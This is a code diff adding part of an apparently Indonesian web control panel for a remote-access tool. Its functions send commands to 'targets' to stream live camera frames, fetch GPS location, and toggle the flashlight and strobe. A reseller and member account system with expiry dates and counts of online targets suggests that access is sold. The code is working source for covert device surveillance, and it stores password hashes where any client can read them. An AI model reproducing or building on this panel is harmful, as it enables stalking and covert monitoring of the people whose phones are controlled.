+  $("#modal").classList.add("show");
+
+  // Tab events
+  $$(".tabs button", box).forEach(b=>{
+    b.onclick = ()=>{
+      $$(".tabs button", box).forEach(x=>x.classList.remove("active"));
+      b.classList.add("active");
+      const tab = b.dataset.tab;
+      $$(".tab-panel", box).forEach(p=>p.classList.toggle("active", p.dataset.panel === tab));
+      State.currentTab = tab;
+      if(tab === "live") setupLiveScreen(tid);
+      if(tab === "locate") setupLocate(tid);
+    };
+  });
+
+  // Toggle events
+  $("#sw-live", box).onchange = (e)=>toggleLive(tid, e.target.checked);
+  $("#sw-loc", box).onchange = (e)=>toggleLocate(tid, e.target.checked);
+  $("#sw-flash", box).onchange = (e)=>toggleFlash(tid, e.target.checked);
+  $("#sw-strobo", box).onchange = (e)=>toggleStrobo(tid, e.target.checked);
+}
+
+// ============================================================
+// COMMANDS
+// ============================================================
+async function sendCommand(tid, type, payload={}){
+  try{
+    const cmdRef = push(ref(db, "commands/"+tid));
+    await set(cmdRef, {type, payload, fromUid: State.uid, status: "pending", createdAt: Date.now()});
+    return true;
+  }catch(e){ toast("Gagal kirim command","err"); return false; }
+}
+
+// ============================================================
+// LIVE SCREEN
+// ============================================================
+async function toggleLive(tid, on){
+  State.liveActive = on;
+  if(on){
+    await sendCommand(tid, "live_on", {fps: 2});
+    toast("Live cam aktif","ok");
+    setupLiveScreen(tid);
+  } else {
+    await sendCommand(tid, "live_off");
+    toast("Live cam nonaktif","info");
+    if(State.unsubLive){State.unsubLive();State.unsubLive=null;}
+    const v = $("#live-view");
+    if(v) v.innerHTML = '<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>';
+  }
+}
+
+function setupLiveScreen(tid){
+  if(State.unsubLive) State.unsubLive();
+  State.unsubLive = onValue(ref(db, "live/"+tid), (snap)=>{
+    if(!snap.exists()) return;
+    const data = snap.val();
+    if(data.frame){
+      const v = $("#live-view");
+      if(v){
+        v.innerHTML = `<div class="live-badge"><span class="d"></span> LIVE</div><img src="${data.frame}" alt="live">`;
+      }
+    }
+  });
+}
+
+// ============================================================
+// LOCATE
+// ============================================================
+async function toggleLocate(tid, on){
+  State.locActive = on;
+  if(on){
+    await sendCommand(tid, "locate");
+    toast("Meminta lokasi...","info");
+    setupLocate(tid);
+  } else {
+    await sendCommand(tid, "locate_off");
+    if(State.unsubLoc){State.unsubLoc();State.unsubLoc=null;}
+    const m = $("#loc-map");
+    if(m) m.innerHTML = '<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>';
+    const c = $("#loc-coords");
+    if(c) c.textContent = "—";
+  }
+}
+
+function setupLocate(tid){
+  if(State.unsubLoc) State.unsubLoc();
+  State.unsubLoc = onValue(ref(db, "locations/"+tid), (snap)=>{
+    if(!snap.exists()) return;
+    const data = snap.val();
+    if(data.lat && data.lng){
+      const lat = data.lat, lng = data.lng;
+      const m = $("#loc-map");
+      if(m) m.innerHTML = `<iframe src="https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed" loading="lazy"></iframe>`;
+      const c = $("#loc-coords");
+      if(c) c.textContent = `${lat}, ${lng}`;
+    }
+  });
+}
+
+// ============================================================
+// TOOLS — SENTER & STROBO
+// ============================================================
+async function toggleFlash(tid, on){
+  State.flashActive = on;
+  await sendCommand(tid, on ? "flashlight_on" : "flashlight_off");
+  toast(on ? "Senter nyala" : "Senter mati", "ok");
+}
+
+async function toggleStrobo(tid, on){
+  State.stroboActive = on;
+  await sendCommand(tid, on ? "strobo_on" : "strobo_off");
+  toast(on ? "Strobo nyala" : "Strobo mati", "ok");
+}
+
+// ============================================================
+// ACCOUNT
+// ============================================================
+function goAccount(){
+  showScreen("account");
+  const u = State.user || {};
+  $("#acc-usn").textContent = u.username || "—";
+  $("#acc-role").textContent = u.role || "member";
+  $("#acc-usercode").textContent = u.userCode || "—";
+  $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
+  if(u.avatar) $("#acc-avatar").src = u.avatar;
+}
+
+// ============================================================
+// TOOLS — TO LINK
+// ============================================================
+function goTools(){
+  showScreen("tools");
+  $("#upload-result").classList.remove("show");
+  $("#upload-progress").classList.remove("show");
+  $("#up-fill").style.width = "0%";
+}
+
+function initUpload(){
+  const zone = $("#upload-zone");
+  const input = $("#upload-input");
+  if(!zone || !input) return;
+
+  // Drag & drop
+  ["dragenter","dragover"].forEach(e=>zone.addEventListener(e, ev=>{ev.preventDefault();zone.classList.add("dragover");}));
+  ["dragleave","drop"].forEach(e=>zone.addEventListener(e, ev=>{ev.preventDefault();zone.classList.remove("dragover");}));
+  zone.addEventListener("drop", ev=>{
+    const f = ev.dataTransfer.files[0];
+    if(f) handleUpload(f);
+  });
+  input.onchange = ()=>{
+    const f = input.files[0];
+    if(f) handleUpload(f);
+    input.value = "";
+  };
+}
+
+async function handleUpload(file){
+  if(file.size > CONFIG.MAX_UPLOAD) return toast("File terlalu besar (max 2 MB)","err");
+  const ext = file.name.split(".").pop().toLowerCase();
+  const ok = ["jpg","jpeg","png","gif","webp","mp4","webm"];
+  if(!ok.includes(ext)) return toast("Format tidak didukung","err");
+
+  $("#upload-progress").classList.add("show");
+  $("#upload-result").classList.remove("show");
+  $("#up-fill").style.width = "0%";
+  $("#up-text").textContent = "Mengunggah... 0%";
+
+  const formData = new FormData();
+  formData.append("file", file, file.name);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", `${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
+
+  xhr.upload.onprogress = (e)=>{
+    if(e.lengthComputable){
+      const pct = Math.round((e.loaded / e.total) * 100);
+      $("#up-fill").style.width = pct + "%";
+      $("#up-text").textContent = `Mengunggah... ${pct}%`;
+    }
+  };
+
+  xhr.onload = ()=>{
+    try{
+      const res = JSON.parse(xhr.responseText);
+      if(res.status && res.path){
+        $("#up-fill").style.width = "100%";
+        $("#up-text").textContent = "Selesai!";
+        setTimeout(()=>{
+          $("#upload-progress").classList.remove("show");
+          showUploadResult(res);
+        }, 400);
+      } else {
+        toast("Upload gagal: " + (res.message || "unknown"), "err");
+        $("#upload-progress").classList.remove("show");
+      }
+    }catch(e){
+      toast("Upload gagal: response invalid","err");
+      $("#upload-progress").classList.remove("show");
+    }
+  };
+
+  xhr.onerror = ()=>{
+    toast("Upload gagal: koneksi error","err");
+    $("#upload-progress").classList.remove("show");
+  };
+
+  xhr.send(formData);
+}
+
+function showUploadResult(res){
+  $("#ur-url").textContent = res.path;
+  $("#ur-size").textContent = fmtSize(res.size);
+  $("#ur-created").textContent = fmtDateTime(Date.now());
+  $("#ur-api").textContent = "Termai";
+  $("#upload-result").classList.add("show");
+
+  $("#btn-copy-url").onclick = async ()=>{
+    try{
+      await navigator.clipboard.writeText(res.path);
+      toast("URL di-copy","ok");
+    }catch(e){
+      toast("Gagal copy","err");
+    }
+  };
+  $("#btn-open-url").onclick = ()=>{
+    window.open(res.path, "_blank");
+  };
+}
+
+// ============================================================
+// PANEL
+// ============================================================
+function goPanel(){
+  const u = State.user || {};
+  const role = u.role || "member";
+  showScreen("panel");
+  $("#panel-title").textContent = `${role.charAt(0).toUpperCase()+role.slice(1)} Panel`;
+  $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;
+
+  const items = {
+    owner: [
+      ["fa-user-plus","Add User"],["fa-users-gear","Manage User"],
+      ["fa-ban","Ban User"],["fa-key","Reset Password"],
+      ["fa-ticket","Invite Code"],["fa-bullhorn","Broadcast"],
+      ["fa-chart-line","Statistics"],["fa-database","Database"]
+    ],
+    reseller: [
+      ["fa-user-plus","Add Member"],["fa-users-gear","Manage Member"],
+      ["fa-clock-rotate-left","Extend Member"]
+    ],
+    member: []
+  };
+  const arr = items[role] || [];
+  if(arr.length === 0){
+    $("#panel-grid").innerHTML = '<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>';
+    return;
+  }
+  $("#panel-grid").innerHTML = arr.map(([ic,txt])=>`
+    <div class="panel-action" data-action="${txt}">
+      <div class="ico-badge"><i class="fa-solid ${ic}"></i></div>
+      <div class="txt">${txt}</div>
+    </div>`).join("");
+  $$(".panel-action").forEach(el=>el.onclick=()=>openPanelAction(el.dataset.action));
+}
+
+function openPanelAction(action){
+  const box = $("#modal-box");
+  const forms = {
+    "Add User": `
+      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-usn" placeholder="username"></div></div>
+      <div class="field"><label>Password</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-pw" placeholder="min 6 karakter"></div></div>
+      <div class="field"><label>Role</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user-tag"></i></div><select id="f-role"><option value="member">Member</option><option value="reseller">Reseller</option></select></div></div>
+      <div class="field"><label>Masa Aktif</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Akun</button>`,
+    "Add Member": `
+      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-usn" placeholder="username"></div></div>
+      <div class="field"><label>Password</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-pw" placeholder="min 6 karakter"></div></div>
+      <div class="field"><label>Masa Aktif</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Member</button>`,
+    "Manage User": `
+      <div class="field"><label>Cari User</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input id="f-search" placeholder="username..."></div></div>
+      <div id="user-list" style="max-height:50vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
+    "Manage Member": `
+      <div class="field"><label>Cari Member</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input id="f-search" placeholder="username..."></div></div>
+      <div id="user-list" style="max-height:50vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
+    "Ban User": `
+      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-ban-usn" placeholder="username"></div></div>
+      <button class="btn btn-danger" id="btn-submit-action"><i class="fa-solid fa-ban"></i> Ban</button>`,
+    "Reset Password": `
+      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-reset-usn" placeholder="username"></div></div>
+      <div class="field"><label>Password Baru</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="f-reset-pw" placeholder="min 6 karakter"></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-key"></i> Reset</button>`,
+    "Invite Code": `
+      <div class="field"><label>Kode</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-ticket"></i></div><input id="f-inv-code" placeholder="XXXX-XXXX"></div></div>
+      <div class="field"><label>Max Uses</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-repeat"></i></div><input type="number" id="f-inv-max" value="1"></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Kode</button>`,
+    "Broadcast": `
+      <div class="field"><label>Judul</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-heading"></i></div><input id="f-bc-title" placeholder="Judul"></div></div>
+      <div class="field"><label>Pesan</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-message"></i></div><textarea id="f-bc-msg" placeholder="Tulis pengumuman..."></textarea></div></div>
+      <div class="field"><label>Gambar URL (opsional)</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-image"></i></div><input id="f-bc-img" placeholder="https://..."></div></div>
+      <div class="field"><label>Link URL (opsional)</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input id="f-bc-url" placeholder="https://..."></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-bullhorn"></i> Kirim</button>`,
+    "Statistics": `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
+    "Database": `<div id="db-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
+    "Extend Member": `
+      <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input id="f-ext-usn" placeholder="username"></div></div>
+      <div class="field"><label>Tambah Hari</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-clock"></i></div><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div></div>
+      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-clock-rotate-left"></i> Perpanjang</button>`
+  };
+
+  box.innerHTML = `<h3>${action}</h3>` + (forms[action] || '<div class="sub">Coming soon.</div>') + `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+
+  const btn = $("#btn-submit-action");
+  if(action === "Add User" || action === "Add Member"){
+    btn.onclick = async ()=>{
+      const usn = $("#f-usn").value.trim();
+      const pw = $("#f-pw").value;
+      const role = action === "Add Member" ? "member" : ($("#f-role")?.value || "member");
+      const days = $("#f-days").value;
+      if(!usn || !pw) return toast("Isi username & password","err");
+      if(pw.length < 6) return toast("Password min 6 karakter","err");
+      try{
+        const usersSnap = await get(ref(db, "users"));
+        const users = usersSnap.exists() ? usersSnap.val() : {};
+        for(const uid in users){ if(users[uid].username === usn) return toast("Username udah dipake","err"); }
+        const salt = genSalt();
+        const hash = await sha256(pw + salt);
+        const userCode = genUserCode();
+        const newRef = push(ref(db, "users"));
+        await set(newRef, {
+          username: usn, passwordHash: hash, passwordSalt: salt,
+          role, userCode, createdBy: State.uid, createdAt: Date.now(),
+          expiresAt: days ? Date.now() + parseInt(days)*86400000 : null,
+          banned: false, avatar: ""
+        });
+        toast(`Akun ${usn} dibuat. Code: ${userCode}`,"ok",6000);
+        closeModal();
+      }catch(e){ toast("Gagal: "+e.message,"err"); }
+    };
+  }
+  if(action === "Ban User"){
+    btn.onclick = async ()=>{
+      const usn = $("#f-ban-usn").value.trim();
+      if(!usn) return toast("Isi username","err");
+      try{
+        const usersSnap = await get(ref(db, "users"));
+        const users = usersSnap.exists() ? usersSnap.val() : {};
+        for(const uid in users){
+          if(users[uid].username === usn){
+            await update(ref(db, "users/"+uid), {banned: true});
+            toast(`User ${usn} di-ban`,"ok"); closeModal(); return;
+          }
+        }
+        toast("User gak ditemukan","err");
+      }catch(e){ toast("Gagal","err"); }
+    };
+  }
+  if(action === "Reset Password"){
+    btn.onclick = async ()=>{
+      const usn = $("#f-reset-usn").value.trim();
+      const pw = $("#f-reset-pw").value;
+      if(!usn || !pw) return toast("Isi semua","err");
+      if(pw.length < 6) return toast("Min 6 karakter","err");
+      try{
+        const usersSnap = await get(ref(db, "users"));
+        const users = usersSnap.exists() ? usersSnap.val() : {};
+        for(const uid in users){
+          if(users[uid].username === usn){
+            const salt = genSalt();
+            const hash = await sha256(pw + salt);
+            await update(ref(db, "users/"+uid), {passwordHash: hash, passwordSalt: salt});
+            toast(`Password ${usn} direset`,"ok"); closeModal(); return;
+          }
+        }
+        toast("User gak ditemukan","err");
+      }catch(e){ toast("Gagal","err"); }
+    };
+  }
+  if(action === "Extend Member"){
+    btn.onclick = async ()=>{
+      const usn = $("#f-ext-usn").value.trim();
+      const days = parseInt($("#f-ext-days").value);
+      if(!usn) return toast("Isi username","err");
+      try{
+        const usersSnap = await get(ref(db, "users"));
+        const users = usersSnap.exists() ? usersSnap.val() : {};
+        for(const uid in users){
+          if(users[uid].username === usn){
+            const base = users[uid].expiresAt && users[uid].expiresAt > Date.now() ? users[uid].expiresAt : Date.now();
+            await update(ref(db, "users/"+uid), {expiresAt: base + days*86400000});
+            toast(`+${days} hari buat ${usn}`,"ok"); closeModal(); return;
+          }
+        }
+        toast("User gak ditemukan","err");
+      }catch(e){ toast("Gagal","err"); }
+    };
+  }
+  if(action === "Broadcast"){
+    btn.onclick = async ()=>{
+      const title = $("#f-bc-title").value.trim();
+      const msg = $("#f-bc-msg").value.trim();
+      const img = $("#f-bc-img").value.trim();
+      const url = $("#f-bc-url").value.trim();
+      if(!msg) return toast("Isi pesan","err");
+      try{
+        const bRef = push(ref(db, "broadcasts"));
+        await set(bRef, {title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now()});
+        toast("Broadcast terkirim","ok"); closeModal();
+      }catch(e){ toast("Gagal","err"); }
+    };
+  }
+  if(action === "Manage User" || action === "Manage Member"){
+    const s = $("#f-search");
+    s.oninput = ()=>{ clearTimeout(window._st); window._st = setTimeout(()=>searchUsersPanel(s.value, action),400); };
+  }
+  if(action === "Statistics") loadStatistics();
+  if(action === "Database") loadDatabase();
+}
+
+async function searchUsersPanel(q, action){
+  const list = $("#user-list");
+  if(!q){ list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>'; return; }
+  try{
+    const snap = await get(ref(db, "users"));
+    const users = snap.exists() ? snap.val() : {};
+    const results = [];
+    for(const uid in users){
+      const u = users[uid];
+      if(u.username.toLowerCase().includes(q.toLowerCase())){
+        if(action === "Manage Member" && u.role !== "member") continue;
+        results.push({uid, ...u});
+      }
+    }
+    if(results.length === 0){ list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>'; return; }
+    list.innerHTML = results.map(u=>`
+      <div class="list-item" style="margin-bottom:8px;cursor:default">
+        <div class="ico-badge"><i class="fa-solid fa-user"></i></div>
+        <div class="txt">
+          <div class="n">${u.username}</div>
+          <div class="d">${u.role} · ${u.banned?"banned":"active"} · ${u.userCode||"—"}</div>
+        </div>
+      </div>
+    `).join("");
+  }catch(e){ list.innerHTML = '<div style="text-align:center;color:var(--error);font-size:12px;padding:20px">Error</div>'; }
+}
+
+async function loadStatistics(){
+  const box = $("#stat-content");
+  try{
+    const users = (await get(ref(db, "users"))).val() || {};
+    const targets = (await get(ref(db, "targets"))).val() || {};
+    let totalUsers=0, owners=0, resellers=0, members=0, banned=0;
+    for(const uid in users){
+      totalUsers++;
+      if(users[uid].role === "owner") owners++;
+      if(users[uid].role === "reseller") resellers++;
+      if(users[uid].role === "member") members++;
+      if(users[uid].banned) banned++;
+    }
+    let totalTargets=0, onlineTargets=0;
+    for(const tid in targets){
+      totalTargets++;
+      if(targets[tid].status === "online") onlineTargets++;
+    }
+    box.innerHTML = `
+      <div class="stat-grid">
+        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${totalUsers}</div></div>
+        <div class="stat-card"><div class="l">Total Targets</div><div class="v info">${totalTargets}</div></div>
+        <div class="stat-card"><div class="l">Online</div><div class="v success">${onlineTargets}</div></div>
+        <div class="stat-card"><div class="l">Banned</div><div class="v warn">${banned}</div></div>
+        <div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div>
+        <div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div>
+        <div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div>
+      </div>`;
+  }catch(e){ box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>'; }
+}
+
+async function loadDatabase(){
+  const box = $("#db-content");
+  try{
+    const nodes = ["users","targets","commands","logs","broadcasts"];
+    const rows = [];
+    for(const n of nodes){
+      try{
+        const snap = await get(ref(db, n));
+        const c = snap.exists() ? Object.keys(snap.val()).length : 0;
+        rows.push(`<div class="list-item" style="margin-bottom:8px;cursor:default"><div class="ico-badge"><i class="fa-solid fa-database"></i></div><div class="txt"><div class="n" style="font-family:'JetBrains Mono',monospace">/${n}</div></div><div style="font-weight:700;color:var(--accent-hover)">${c}</div></div>`);
+      }catch(e){ rows.push(`<div style="font-size:12px;color:var(--error)">Error /${n}</div>`); }
+    }
+    box.innerHTML = rows.join("");
+  }catch(e){ box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>'; }
+}
+
+// ============================================================
+// SETTINGS / LOGOUT
+// ============================================================
+function openSettings(){
+  const box = $("#modal-box");
+  box.innerHTML = `
+    <h3>Settings</h3>
+    <div class="sub">Ubah password</div>
+    <div class="field"><label>Password Lama</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-old"></div></div>
+    <div class="field"><label>Password Baru</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-new"></div></div>
+    <div class="field"><label>Konfirmasi</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="set-conf"></div></div>
+    <button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
+  $("#modal").classList.add("show");
+  $("#btn-save-pw").onclick = async ()=>{
+    const o=$("#set-old").value, n=$("#set-new").value, c=$("#set-conf").value;
+    if(!o||!n) return toast("Isi semua","err");
+    if(n!==c) return toast("Konfirmasi gak cocok","err");
+    if(n.length<6) return toast("Min 6 karakter","err");
+    const oldHash = await sha256(o + State.user.passwordSalt);
+    if(oldHash !== State.user.passwordHash) return toast("Password lama salah","err");
+    const salt = genSalt();
+    const hash = await sha256(n + salt);
+    await update(ref(db, "users/"+State.uid), {passwordHash: hash, passwordSalt: salt});
+    State.user.passwordHash = hash; State.user.passwordSalt = salt;
+    toast("Password diubah","ok"); closeModal();
+  };
+}
+
+function doLogout(){
+  const box = $("#modal-box");
+  box.innerHTML = `
+    <h3>Log Out</h3>
+    <div class="sub">Yakin mau keluar?</div>
+    <div class="modal-actions">
+      <button class="btn btn-ghost" onclick="closeModal()">Batal</button>
+      <button class="btn btn-primary" onclick="confirmLogout()">Log Out</button>
+    </div>`;
+  $("#modal").classList.add("show");
+}
+function confirmLogout(){
+  localStorage.removeItem("bluxus_uid");
+  State.user = null; State.uid = null;
+  if(State.unsubLive) State.unsubLive();
+  if(State.unsubLoc) State.unsubLoc();
+  closeModal();
+  showScreen("login");
+  $("#login-usn").value = ""; $("#login-pw").value = "";
+}
+function closeModal(){ $("#modal").classList.remove("show"); }
+
+// ============================================================
+// EVENTS
+// ============================================================
+function bindEvents(){
+  $("#btn-login").onclick = doLogin;
+  $("#login-pw").addEventListener("keydown", e=>{ if(e.key === "Enter") doLogin(); });
+  ["","-rat","-tools","-account","-about","-panel"].forEach(suf=>{
+    const b = $("#btn-hamburger" + suf);
+    if(b) b.onclick = openSidebar;
+  });
+  $("#sidebar-backdrop").onclick = closeSidebar;
+  $$(".sb-item").forEach(el=>{ el.onclick = ()=>goPage(el.dataset.page); });
+  $("#btn-settings").onclick = openSettings;
+  $("#btn-logout").onclick = doLogout;
+  $("#btn-change-photo").onclick = ()=>{ toast("Fitur foto profil dalam pengembangan","info"); };
+  $("#modal").addEventListener("click", e=>{ if(e.target.id === "modal") closeModal(); });
+  initUpload();
+}
+
+// ============================================================
+// INIT
+// ============================================================
+async function init(){
+  bindEvents();
+  watchConnection();
+  const resumed = await tryResume();
+  runLoading();
+  if(resumed){
+    setTimeout(()=>goDashboard(), 2600);
+  }
+}
+
+window.addEventListener("DOMContentLoaded", init);
+window.closeModal = closeModal;
+window.confirmLogout = confirmLogout;
+</script>
+</body>
+</html>
